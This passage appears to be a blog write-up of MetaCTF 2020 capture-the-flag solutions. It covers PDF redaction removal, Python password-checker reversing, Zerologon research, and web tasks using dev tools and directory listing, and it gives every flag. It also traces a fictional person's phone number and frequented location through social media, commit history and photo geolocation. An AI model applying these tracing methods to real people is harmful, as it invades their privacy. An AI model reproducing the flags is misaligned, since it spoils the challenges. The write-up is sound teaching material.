The IT Department just conducted a search through his company-provided laptop and found an old memo containing a One Time Password to log into his e-mail. However it seems as if someone has redacted the code, can you recover it for us?</p></blockquote><p>We&rsquo;re given a PDF where the code is covered by a black box. It appears to be a scanned PDF, so we can&rsquo;t highlight any of the text (and potentially the text underneath the box).</p><p><img src=/img/metactf-2020/memo.png alt="Black text on white background: &ldquo;Upon request, we have reset your backup Two-Factor Authentication code. Please store this document in a secure place and destroy it once the code has been used. CODE: [black box]" "></p><p>However, if we open the PDF in Adobe Acrobat Reader and try to edit it, it&rsquo;ll immediately remove the box and show the flag.</p><p><strong>Flag</strong>: <code>MetaCTF{politics_are_for_puppets}</code><br><strong>Tools</strong>: Adobe Acrobat Reader</p><h2 id=password-here-please-unfinished>Password Here Please [unfinished]</h2><blockquote><p>I forgot my bank account password! Luckily for me, I wrote a program that checks if my password is correct just in case I forgot which password I used, so this way I don&rsquo;t lock myself out of my account. Unfortunately, I seem to have lost my password list as well&mldr;Could you take a look and see if you can find my password for me?</p></blockquote><p>⭐ This was Joyce&rsquo;s favourite challenge!</p><p>We&rsquo;re given a Python script to validate the user&rsquo;s password. It checks the length, and then splits the password into 3 different &ldquo;chunks&rdquo; and validates each chunk separately.</p><p>In the length check:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#ff79c6>if</span>(<span style=color:#8be9fd;font-style:italic>len</span>(password[::<span style=color:#ff79c6>-</span><span style=color:#bd93f9>2</span>]) <span style=color:#ff79c6>!=</span> <span style=color:#bd93f9>12</span> <span style=color:#ff79c6>or</span> <span style=color:#8be9fd;font-style:italic>len</span>(password[<span style=color:#bd93f9>17</span>:]) <span style=color:#ff79c6>!=</span> <span style=color:#bd93f9>7</span>):
    <span style=color:#ff79c6>print</span>(<span style=color:#f1fa8c>&#34;Woah, you&#39;re not even close!!&#34;</span>)
    <span style=color:#ff79c6>return</span> False
pwlen <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>len</span>(password)
</code></pre></div><p>From this, we can tell that the password length will be 24 characters, because <code>len(password[::-2])</code> will count every <em>other</em> character, giving us 12 characters, and <code>len(password[17:])</code> will give us 7 characters from the 17th character onward.</p><p>For the first chunk:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>chunk1 <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;key&#39;</span><span style=color:#ff79c6>.</span>join([<span style=color:#8be9fd;font-style:italic>chr</span>(<span style=color:#bd93f9>0x98</span> <span style=color:#ff79c6>-</span> <span style=color:#8be9fd;font-style:italic>ord</span>(password[c]))
                         <span style=color:#ff79c6>for</span> c <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>0</span>, <span style=color:#8be9fd;font-style:italic>int</span>(pwlen <span style=color:#ff79c6>/</span> <span style=color:#bd93f9>3</span>))])
<span style=color:#ff79c6>if</span> <span style=color:#f1fa8c>&#34;&#34;</span><span style=color:#ff79c6>.</span>join([c <span style=color:#ff79c6>for</span> c <span style=color:#ff79c6>in</span> chunk1[::<span style=color:#bd93f9>4</span>]]) <span style=color:#ff79c6>!=</span> <span style=color:#f1fa8c>&#39;&amp;e&#34;3&amp;Ew*&#39;</span>:
        <span style=color:#ff79c6>print</span>(<span style=color:#f1fa8c>&#34;You call that the password? HA!&#34;</span>)
        <span style=color:#ff79c6>return</span> False
</code></pre></div><p>In the first line, we&rsquo;re taking the ASCII value of each password character (i.e. <code>ord(password[c])</code>) and subtracting it from 152, which is the decimal version of <code>0x98</code>.<br>Then, we convert that value back to a character using <code>chr</code>, and we join it all with the word <code>key</code>. This creates a string like <code>_key_key_key</code> (etc.) where the <code>_</code> is a character from our password. We call this string <code>chunk1</code>.<br>We then check what every fourth character of <code>chunk1</code> is - every fourth character being the slots that were originally in the password.<br>We&rsquo;re given the characters to check with, so we can then do some ASCII math by subtracting their ASCII value from 152 to get the original password characters in the chunk.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>chunk1 <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;r3verS!n&#34;</span>
</code></pre></div><p>For the second chunk, we have:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>chunk2 <span style=color:#ff79c6>=</span> [<span style=color:#8be9fd;font-style:italic>ord</span>(c) <span style=color:#ff79c6>-</span> <span style=color:#bd93f9>0x1F</span> <span style=color:#ff79c6>if</span> <span style=color:#8be9fd;font-style:italic>ord</span>(c) <span style=color:#ff79c6>&gt;</span> <span style=color:#bd93f9>0x60</span>
                  <span style=color:#ff79c6>else</span> (<span style=color:#8be9fd;font-style:italic>ord</span>(c) <span style=color:#ff79c6>+</span> <span style=color:#bd93f9>0x1F</span> <span style=color:#ff79c6>if</span> <span style=color:#8be9fd;font-style:italic>ord</span>(c) <span style=color:#ff79c6>&gt;</span> <span style=color:#bd93f9>0x40</span> <span style=color:#ff79c6>else</span> <span style=color:#8be9fd;font-style:italic>ord</span>(c))
                  <span style=color:#ff79c6>for</span> c <span style=color:#ff79c6>in</span> password[<span style=color:#8be9fd;font-style:italic>int</span>(pwlen <span style=color:#ff79c6>/</span> <span style=color:#bd93f9>3</span>) : <span style=color:#8be9fd;font-style:italic>int</span>(<span style=color:#bd93f9>2</span> <span style=color:#ff79c6>*</span> pwlen <span style=color:#ff79c6>/</span> <span style=color:#bd93f9>3</span>)]]
ring <span style=color:#ff79c6>=</span> [<span style=color:#bd93f9>54</span>, <span style=color:#ff79c6>-</span><span style=color:#bd93f9>45</span>, <span style=color:#bd93f9>9</span>, <span style=color:#bd93f9>25</span>, <span style=color:#ff79c6>-</span><span style=color:#bd93f9>42</span>, <span style=color:#ff79c6>-</span><span style=color:#bd93f9>25</span>, <span style=color:#bd93f9>31</span>, <span style=color:#ff79c6>-</span><span style=color:#bd93f9>79</span>]
<span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>0</span>, <span style=color:#8be9fd;font-style:italic>len</span>(chunk2)):
    <span style=color:#ff79c6>if</span>(<span style=color:#bd93f9>0</span> <span style=color:#ff79c6>if</span> i <span style=color:#ff79c6>==</span> <span style=color:#8be9fd;font-style:italic>len</span>(chunk2) <span style=color:#ff79c6>-</span> <span style=color:#bd93f9>1</span> <span style=color:#ff79c6>else</span> chunk2[i <span style=color:#ff79c6>+</span> <span style=color:#bd93f9>1</span>]) <span style=color:#ff79c6>!=</span> chunk2[i] <span style=color:#ff79c6>+</span> ring[i]:
        <span style=color:#ff79c6>print</span>(<span style=color:#f1fa8c>&#34;You cracked the passwo-- just kidding, try again! &#34;</span> <span style=color:#ff79c6>+</span> <span style=color:#8be9fd;font-style:italic>str</span>(i))
        <span style=color:#ff79c6>return</span> False
</code></pre></div><p>We start by modifying the ASCII value for each character again. To make the list comprehension a little more readable, we can visualize it like so, where <code>new_char</code> will be part of the <code>chunk2</code> array.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#ff79c6>for</span> c <span style=color:#ff79c6>in</span> second_third_of_password:
    <span style=color:#ff79c6>if</span> <span style=color:#8be9fd;font-style:italic>ord</span>(c) <span style=color:#ff79c6>&gt;</span> <span style=color:#bd93f9>96</span>: 
        new_char <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>ord</span>(c) <span style=color:#ff79c6>-</span> <span style=color:#bd93f9>31</span>
    <span style=color:#ff79c6>elif</span> <span style=color:#8be9fd;font-style:italic>ord</span>(c) <span style=color:#ff79c6>&gt;</span> <span style=color:#bd93f9>64</span>: 
        new_char <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>ord</span>(c) <span style=color:#ff79c6>+</span> <span style=color:#bd93f9>31</span>
    <span style=color:#ff79c6>else</span>:
        new_char <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>ord</span>(c)
</code></pre></div><p>We then define a new array, <code>ring</code>, and iterate through the <code>chunk2</code> array and compare it to the <code>ring</code> array.<br>For any <code>i</code>-th iteration, we want to check if <code>chunk2[i+1] == chunk2[i] + ring[i]</code>. If <code>chunk2[i]</code> is the last item in the array, we&rsquo;ll use <code>0</code> as a placeholder for the &lsquo;next&rsquo; value.<br>If we start from the last value, we see that we&rsquo;re checking <code>0 == chunk2[7] + ring[7]</code>, where <code>ring[7] = 79</code>. This will give us the value of <code>chunk2[7]</code> - 79.<br>From there, we can make our way backwards through the array, and get the values of each <code>chunk2</code> character.<br>Then, based on the <code>if</code> statement from before, we can calculate what the original ASCII value of each password character in our second check was.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>chunk1 <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;r3verS!n&#34;</span>
chunk2 <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;g_pyTh0n&#34;</span>
</code></pre></div><p><em>Post-CTF</em>: Unfortunately we didn&rsquo;t get a chance to finish this challenge. However, after looking at another&rsquo;s solutions, we were able to figure out how to approach the third chunk.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>code <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0xaace63feba9e1c71ef460e6dbf1b1fbabfd7e2e35401440ac57e93bd9ba41c4fbd5d437b1dfab11fe7a1c6c2035982a71765fc9a7b32ccef695dffb71babe15733f5bb29f76aae5f80fff</span>

valid <span style=color:#ff79c6>=</span> True
<span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>0</span>, <span style=color:#8be9fd;font-style:italic>len</span>(chunk3)):
     <span style=color:#ff79c6>if</span>(<span style=color:#8be9fd;font-style:italic>ord</span>(chunk3[i]) <span style=color:#ff79c6>&lt;</span> <span style=color:#bd93f9>0x28</span>):
        valid <span style=color:#ff79c6>=</span> False
    code <span style=color:#ff79c6>-=</span> (<span style=color:#bd93f9>257</span> <span style=color:#ff79c6>**</span> (<span style=color:#8be9fd;font-style:italic>ord</span>(chunk3[i]) <span style=color:#ff79c6>-</span> <span style=color:#bd93f9>0x28</span>)) <span style=color:#ff79c6>*</span> (<span style=color:#bd93f9>1</span> <span style=color:#ff79c6>&lt;&lt;</span> i)
</code></pre></div><p>We were given the hint to try looking at the given <code>code</code> in base 257, so we tried converting it:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>to_basen_str</span>(n,base):
    <span style=color:#ff79c6>if</span> n <span style=color:#ff79c6>&lt;</span> base:
        <span style=color:#ff79c6>return</span> [n]
    <span style=color:#ff79c6>else</span>:
        <span style=color:#6272a4># divide by base and append the remainder</span>
        <span style=color:#ff79c6>return</span> to_basen_str(n <span style=color:#ff79c6>//</span> base,base) <span style=color:#ff79c6>+</span> [n <span style=color:#ff79c6>%</span> base]

z <span style=color:#ff79c6>=</span> to_basen_str(code,<span style=color:#bd93f9>257</span>)
</code></pre></div><p>This creates an array where each slot is a &lsquo;place&rsquo; value in our base 257 number.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>[<span style=color:#bd93f9>8</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>128</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>2</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>17</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>64</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>4</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>32</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>]
</code></pre></div><p>We know that:</p><ul><li>Our goal is to reduce <code>code</code> to 0</li><li>We do this by subtracting <code>(257 ** ascii) * (1 &lt;&lt; i)</code> from <code>code</code></li></ul><p>Let&rsquo;s take a step back. Instead of thinking of this in base 257, let&rsquo;s think of a simpler number, in a more familiar base (10). For example, <code>100600905000</code>.</p><p>To reduce <code>100600905000</code> to 0, we need to subtract the following from it:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#bd93f9>10</span><span style=color:#ff79c6>^</span><span style=color:#bd93f9>3</span> <span style=color:#ff79c6>*</span> <span style=color:#bd93f9>5</span>
<span style=color:#bd93f9>10</span><span style=color:#ff79c6>^</span><span style=color:#bd93f9>5</span> <span style=color:#ff79c6>*</span> <span style=color:#bd93f9>9</span>
<span style=color:#bd93f9>10</span><span style=color:#ff79c6>^</span><span style=color:#bd93f9>8</span> <span style=color:#ff79c6>*</span> <span style=color:#bd93f9>6</span>
<span style=color:#bd93f9>10</span><span style=color:#ff79c6>^</span><span style=color:#bd93f9>11</span> <span style=color:#ff79c6>*</span> <span style=color:#bd93f9>1</span>
</code></pre></div><p>So back to our base 257 string. Let&rsquo;s pull out all the indices that have a non-zero value:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>ind <span style=color:#bd93f9>30</span>, num <span style=color:#bd93f9>32</span>
ind <span style=color:#bd93f9>39</span>, num <span style=color:#bd93f9>4</span>
ind <span style=color:#bd93f9>45</span>, num <span style=color:#bd93f9>64</span>
ind <span style=color:#bd93f9>55</span>, num <span style=color:#bd93f9>17</span>
ind <span style=color:#bd93f9>62</span>, num <span style=color:#bd93f9>2</span>
ind <span style=color:#bd93f9>70</span>, num <span style=color:#bd93f9>128</span>
ind <span style=color:#bd93f9>74</span>, num <span style=color:#bd93f9>8</span>
</code></pre></div><p>We know that we have to subtract those values from <code>code</code>, so let&rsquo;s rewrite them like we did with the base 10 string:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#6272a4># 257^(ascii) * (1 &lt;&lt; i)</span>
<span style=color:#bd93f9>257</span><span style=color:#ff79c6>^</span><span style=color:#bd93f9>30</span> <span style=color:#ff79c6>*</span> <span style=color:#bd93f9>32</span>
<span style=color:#bd93f9>257</span><span style=color:#ff79c6>^</span><span style=color:#bd93f9>39</span> <span style=color:#ff79c6>*</span> <span style=color:#bd93f9>4</span>
<span style=color:#bd93f9>257</span><span style=color:#ff79c6>^</span><span style=color:#bd93f9>45</span> <span style=color:#ff79c6>*</span> <span style=color:#bd93f9>64</span>
<span style=color:#bd93f9>257</span><span style=color:#ff79c6>^</span><span style=color:#bd93f9>55</span> <span style=color:#ff79c6>*</span> <span style=color:#bd93f9>17</span>
<span style=color:#bd93f9>257</span><span style=color:#ff79c6>^</span><span style=color:#bd93f9>62</span> <span style=color:#ff79c6>*</span> <span style=color:#bd93f9>2</span>
<span style=color:#bd93f9>257</span><span style=color:#ff79c6>^</span><span style=color:#bd93f9>70</span> <span style=color:#ff79c6>*</span> <span style=color:#bd93f9>128</span>
<span style=color:#bd93f9>257</span><span style=color:#ff79c6>^</span><span style=color:#bd93f9>74</span> <span style=color:#ff79c6>*</span> <span style=color:#bd93f9>8</span>
</code></pre></div><p>In this format, it&rsquo;s a lot easier to understand: the indices are our exponents, which are actually the ASCII values of our password characters (minus 40!).</p><p>Notice, though, that we pulled 7 indices, but we know that there should be <em>8</em>. We also know that each number should be a power of 2,<sup id=fnref:4><a href=#fn:4 class=footnote-ref role=doc-noteref>4</a></sup> for 2^0 all the way to 2^7, but we have the number 17 and we&rsquo;re missing the number 1.</p><p>But what if there were <em>two</em> characters that mapped to index 55? We could then split 17 into two powers of 2, 16 and 1.</p><p>Here&rsquo;s our final list:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>ind <span style=color:#bd93f9>55</span>, num <span style=color:#bd93f9>1</span>
ind <span style=color:#bd93f9>62</span>, num <span style=color:#bd93f9>2</span>
ind <span style=color:#bd93f9>39</span>, num <span style=color:#bd93f9>4</span>
ind <span style=color:#bd93f9>74</span>, num <span style=color:#bd93f9>8</span>
ind <span style=color:#bd93f9>55</span>, num <span style=color:#bd93f9>16</span>
ind <span style=color:#bd93f9>30</span>, num <span style=color:#bd93f9>32</span>
ind <span style=color:#bd93f9>45</span>, num <span style=color:#bd93f9>64</span>
ind <span style=color:#bd93f9>70</span>, num <span style=color:#bd93f9>128</span>
</code></pre></div><p>Doing some ASCII math again (adding 40) with the indices, we finally get the final chunk of our password:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>chunk1 <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;r3verS!n&#34;</span>
chunk2 <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;g_pyTh0n&#34;</span>
chunk3 <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;_fOr_FUn&#34;</span>
</code></pre></div><p>Putting it all together, we finally get the flag.</p><p><strong>Flag</strong>: <code>r3verS!ng_pyTh0n_fOr_FUn</code><br><strong>Tools</strong>: <a href=http://www.asciitable.com/>ASCII table</a></p><h1 id=reconnaissance>Reconnaissance</h1><h2 id=big-breaches>Big Breaches</h2><blockquote><p>How many unique emails were exposed in the biggest single collection of breached usernames/passwords? Provide the answer (flag) in the format MetaCTF{number}</p></blockquote><p>There&rsquo;s a site called <a href=https://haveibeenpwned.com>Have I Been Pwned</a>, where you can enter your email to see if your information has ever been breached. They also conveniently keep a list of the largest data breaches ever:
<img src=/img/metactf-2020/breaches.png alt="List of largest data breaches: at the top is 772,904,991 for Collection #1 accounts"></p><p><strong>Flag</strong>: <code>MetaCTF{772,904,991}</code><br><strong>Further reading</strong>: <a href=https://haveibeenpwned.com>Have I Been Pwned</a>,
the <a href=https://www.troyhunt.com/the-773-million-record-collection-1-data-reach/>Collection #1 data breach</a></p><h2 id=not-so-itsy-bitsy-spider>Not So Itsy Bitsy Spider</h2><blockquote><p>Recent reporting indicates that a prominent ransomware operator, known as WIZARD SPIDER, was able to deploy Ryuk ransomware in an environment within 5 hours of compromise.
What recent, critical vulnerability was exploited in this environment to gain elevated privileges? The flag will be in the following format: CVE-XXXX-XXXX.</p></blockquote><p>&ldquo;WIZARD SPIDER&rdquo; and &ldquo;RYUK&rdquo; sound like <em>pretty</em> unique names, so Googling those together brought me to <a href=https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/>this blog post from the DFIR Report</a>. It&rsquo;s from last week, and it also mentions that they were able to do it in 5 hours.</p><p>The second sentence contains the name and number of the CVE, which gives us the flag.</p><p><strong>Flag</strong>: CVE-2020-1472<br><strong>Further reading</strong>: <a href=https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/>Ryuk in 5 hours</a></p><h2 id=diving-into-the-announcement>Diving into the Announcement</h2><blockquote><p>Vulnerabilities are patched in software all the time, and for the most serious ones, researchers work to build proof-of-concept (POC) exploits for them. As defenders, we need to continuously monitor when new public exploits drop, figure out how they work, and ensure we&rsquo;re protected against them. Recently, Microsoft announced CVE-2020-1472. Your task is to locate a public exploit for it and identify the vulnerable function that the POCs call. The flag will be the function&rsquo;s name.</p></blockquote><p>This is the same CVE from the previous challenge! From the blog post, we know its common name, Zerologon, so we can start Googling for POC exploits from there.</p><p>That led me to <a href=https://github.com/dirkjanm/CVE-2020-1472>this Github repo</a>, and specifically <a href=https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py>this Github file</a>.</p><p>If we scroll down to the <code>exploit()</code> function, we see this method call:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>request <span style=color:#ff79c6>=</span> nrpc<span style=color:#ff79c6>.</span>NetrServerPasswordSet2()
</code></pre></div><p>Which gives us our flag.</p><p><strong>Flag</strong>: <code>NetrServerPasswordSet2</code><br><strong>Further reading</strong>: <a href=https://github.com/dirkjanm/CVE-2020-1472/>POC Exploit</a></p><h2 id=finding-mr-casyn>Finding Mr Casyn</h2><blockquote><p>We&rsquo;re looking for a Mr. Casyn, who has been reported missing. We believe he lives in the Chicagoland area, but don&rsquo;t think he&rsquo;s in Illinois proper. We need your help finding him and identifying the right Mr. Casyn will help us begin our search. The flag for this challenge is the first name of Mr. Casyn.</p></blockquote><p>We started out with understanding what exactly <code>Chicagoland</code> is. Turns out it&rsquo;s a name for &ldquo;Chicago and cities nearby&rdquo;, and stretches into both Wisconsin and Indiana.<br>We knew from the challenge description that Mr. Casyn wasn&rsquo;t in Illinois, so we looked at a map and determined that Gary, Indiana and Kenosha, Wisconsin were also possible places he could be.<br>When we failed to find him there, we got a <a href=https://wikitravel.org/en/Chicagoland>list of cities in Chicagoland</a> and figured out we missed one possible city - Hammond, Indiana.</p><p>Searching for Casyn in Hammond, Indiana gave us his <a href=https://www.linkedin.com/in/vedder-casyn/>LinkedIn</a> and (now-defunct) <a href=https://www.facebook.com/vedder.casyn.5>Facebook</a> pages, which told us his first name was <code>Vedder</code>.</p><p><strong>Flag</strong>: <code>Vedder</code></p><h2 id=ring-ring>Ring Ring</h2><blockquote><p>We want to try and reach out to Mr. Casyn via telephone. Can you figure out his phone number? Flag format: XXX-XXX-XXXX. Example: 123-456-7890</p></blockquote><p>⭐ This was Dean&rsquo;s favourite challenge!</p><p>Now that we had Casyn&rsquo;s first name and LinkedIn, we also got access to his <a href=https://veddercasyn.me/>personal website</a>. This also listed <a href=https://github.com/veddercasyn>his Github profile</a>, and we noticed that his personal website was also <a href=https://github.com/veddercasyn/veddercasyn.github.io>hosted on Github</a>.</p><p>Looking through each commit individually, Dean found <a href=https://github.com/veddercasyn/veddercasyn.github.io/commit/9257913>a commit where Casyn&rsquo;s number was visible</a>:
<img src=/img/metactf-2020/commits.png alt="Commit 957913: Red line is removed, where he removed his phone number written out as words."></p><p><strong>Flag</strong>: 929-249-4018</p><h2 id=hangout-spots>Hangout Spots</h2><blockquote><p>There was no reply from Mr. Casyn&rsquo;s phone. Can you find out where he likes to frequently hang out so we can look for clues of where he&rsquo;s been recently? Once you find the image, think of how we can use what we know to geolocate the image based on what&rsquo;s in the picture. Flag format is street name, city, state abbreviation zip code. Example: 301 Park Ave, New York, NY 10022</p></blockquote><p>⭐ This was Ruju&rsquo;s favourite challenge!</p><p>On Casyn&rsquo;s website, he has a photo of a place called &ldquo;Theo&rsquo;s&rdquo;, with a caption &ldquo;I don&rsquo;t get to go here often, but I love it when I can!&rdquo;.</p><p>However, looking through his commit history, Casyn has <a href=https://github.com/veddercasyn/veddercasyn.github.io/commit/54ef2b15a962db18a5a13512dc97e1b79c5280d6>a commit that shows he <em>used</em> to have a different picture there</a> with the caption &ldquo;Love spending time here!&rdquo;.</p><p>Going to that Imgur link shows this photo:
<img src=https://i.imgur.com/uTHNQT2.png alt="Sun flares on the right. There&rsquo;s a parking lot with cars, a tower somewhere in the background, and a tree in the foreground. The main focus is a large reddish building with six windows."></p><p>This gives us a few pieces of information:</p><ul><li>There&rsquo;s a tower close by</li><li>There&rsquo;s a parking lot</li><li>The building has reddish-brick</li><li>The roof is sloped, not flat</li><li>The building has two stories and lots of windows</li><li>The sun is in our eyes, meaning that way is either east or west</li></ul><p>We weren&rsquo;t really sure what to do with the tower information - although we acknowledged it would be super useful - so we tried to look for sloping roofs near parking lots in Hammond, Indiana on Google Maps satellite view.<br>We especially tried to focus on places that were close to either Casyn&rsquo;s workplace (Planet Fitness) or the Theo&rsquo;s he mentioned he liked to go to sometimes.</p><p>After a lot of searching, we weren&rsquo;t really getting anywhere. We went back to the photo and tried to think about what <em>kind</em> of building this could be. It didn&rsquo;t look industrial, nor like a mall or plaza, but we agreed that it could be some kind of community centre or library. With some zooming, we spotted some books in the second-story windows, so we tried searching for libraries in Hammond.</p><p><a href="https://www.google.com/maps/@41.6177775,-87.5146411,3a,54.7y,232.99h,96.47t/data=!3m6!1e1!3m4!1sh2dAifryR801qCzDTbgO6A!2e0!7i16384!8i8192">Turns out there&rsquo;s only one</a>! And it has reddish brick, and a sloped roof, and is next to a parking lot &mldr;</p><p><img src=/img/metactf-2020/streetview.png alt="Aerial view of Hammond Public Library, that has the address and information in a sidebar."></p><p>Thankfully, Google Maps gave us the full address, which was the flag.</p><p><strong>Flag</strong>: <code>564 State St, Hammond, IN 46320</code></p><h1 id=web-exploitation>Web Exploitation</h1><h2 id=high-security-fan-page>High Security Fan Page</h2><blockquote><p>Uh oh, I woke up to hear that some Swifties seem to have sabotaged my Katy Perry fan page! After writing about why KP is clearly the better artist, I believe they hacked into the system and somehow changed my password!
I need to publish a big story today before TMZ steals my scoop, however I can&rsquo;t find my way back into the admin panel. Can you please help me out by finding my password so I can get back to work?</p></blockquote><p>Clicking the site linked takes you to a page with only this on it:
<img src=/img/metactf-2020/login.png alt="Katy Perry Fan Club Admin Login. On the right there is a photo of Katy Perry, while on the left there is a Username and Password field, with a blue Submit button."></p><p>Opening up dev tools and going to the Debugger panel (the Sources panel on Chrome) gives us this:
<img src=/img/metactf-2020/debugger.png alt="Screenshot of a JS snippet. There is a if statement that checks the password, which is the flag."></p><p><strong>Flag</strong>: <code>MetaCTF{So_You_Wanna_Play_With_Magic}</code><br><strong>Tools</strong>: Browser dev tools<br><strong>Bonus</strong>: You can either enter the credentials <code>ChrisM</code> and <code>MetaCTF{So_You_Wanna_Play_With_Magic}</code> to get to the Admin Panel <em>or</em> you can just nagivate to <code>/adminpanel.html</code></p><p>The Admin Panel:
<img src=/img/metactf-2020/admin.png alt="Katy Perry Official Fanbase 2.0. There are four posts: KP Doin' Her Thang, Why We H8 Taylor Swift, Out Here Vibin', and Why KP is the Best."></p><h2 id=barrys-web-application>Barry&rsquo;s Web Application</h2><blockquote><p>I&rsquo;ve made this cool new web application that I plan to use to host a blog. Please check it out at <a href=http://host1.metaproblems.com>http://host1.metaproblems.com</a>:5620/ Right now it&rsquo;s still currently being built, but I hope you enjoy what&rsquo;s there so far!</p></blockquote><p>Clicking on this URL redirects you to the page <code>/dev/webapp/index.html</code>. If we modify the URL to go to <code>http://host1.metaproblems.com:5620/dev</code> instead, we can actually see the directory tree for this site:</p><p><img src=/img/metactf-2020/directory.png alt="Directory tree that contains two folders, docs and webapp."></p><p>Clicking on the <code>docs</code> folder will then show a file called <code>flag.txt</code>, which is where our flag is stored.</p><p><strong>Flag</strong>: <code>MetaCTF{Dont_l3t_y0ur_d1rect0ries_b3_l1st3d}</code></p><h2 id=everyone-loves-a-good-cookie>Everyone Loves a Good Cookie</h2><blockquote><p>Cookies are used by websites to keep track of user sessions and help with authentication. Can you spot the issue with this site and convince it that you&rsquo;re authenticated?</p></blockquote><p>We&rsquo;re taken to this site:
